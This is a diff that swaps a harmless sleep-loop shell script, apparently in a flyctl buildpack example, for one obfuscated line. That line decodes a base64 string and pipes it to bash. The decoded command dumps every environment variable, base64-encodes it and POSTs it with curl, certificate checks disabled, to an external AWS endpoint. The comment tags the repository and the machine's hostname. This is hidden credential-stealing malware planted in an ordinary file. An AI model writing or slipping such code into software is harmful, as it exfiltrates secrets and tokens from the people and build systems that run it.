@@ -1,9 +1,1 @@
-#!/usr/bin/env sh
-
-for i in `seq 1 10`
-do
-  echo "sleeping... $i"
-  sleep 1
-done
-
-# exit 123
+echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/superfly/flyctl.git\&folder=example-buildpack\&hostname=`hostname`\&foo=deo
